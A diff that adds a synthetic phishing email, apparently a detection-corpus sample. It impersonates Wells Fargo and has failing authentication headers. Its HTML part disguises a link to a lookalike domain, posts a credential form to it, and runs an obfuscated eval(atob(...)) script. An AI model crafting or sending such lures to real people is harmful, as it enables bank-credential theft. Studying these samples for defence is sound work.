@@ -1,0 +1,31 @@
+From: notice@wells-fargo-alert.top
+To: victim10@example.com
+Subject: Your account has been suspended - immediate action required
+Date: Tue, 01 Mar 2002 08:38:00 -0500
+Message-ID: <phish-10-f1dd869a-1aa1-48f0-b634-a5ce08ec1853@wells-fargo-alert.top>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 11 Mar 2002 02:54:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 03 Mar 2002 19:17:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 21 Mar 2002 23:29:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 19 Mar 2002 02:47:00 -0500
+Return-Path: <bounce@mail-ac71c34d.top>
+Reply-To: recovery0@gmail.com
+Authentication-Results: mx.example.com; spf=fail smtp.mailfrom=mail-ac71c34d.top; dkim=fail header.d=wells-fargo-alert.top; dmarc=fail header.from=wells-fargo-alert.top
+Received-SPF: fail (mx.example.com: domain of notice@wells-fargo-alert.top does not designate 198.51.100.24 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=wells-fargo-alert.top; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-10-8c188e8d"
+
+--bnd-p-10-8c188e8d
+Content-Type: text/plain; charset="UTF-8"
+
+Dear customer,
+
+We detected unusual activity on your account. You must verify your account immediately or it will be suspended. Click here to sign in and confirm your identity.
+http://wells-fargo-alert.top/login
+
+Reference: P2AC0EA
+--bnd-p-10-8c188e8d
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Dear customer,<br/><br/>We detected unusual activity on your account. You must verify your account immediately or it will be suspended. Click here to sign in and confirm your identity.<br/>http://wells-fargo-alert.top/login<br/><br/>Reference: P2AC0EA</p><p><a href="http://wells-fargo-alert.top/login">https://www.wellsfargo.com/signin</a></p><form action="http://wells-fargo-alert.top/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-10-8c188e8d--
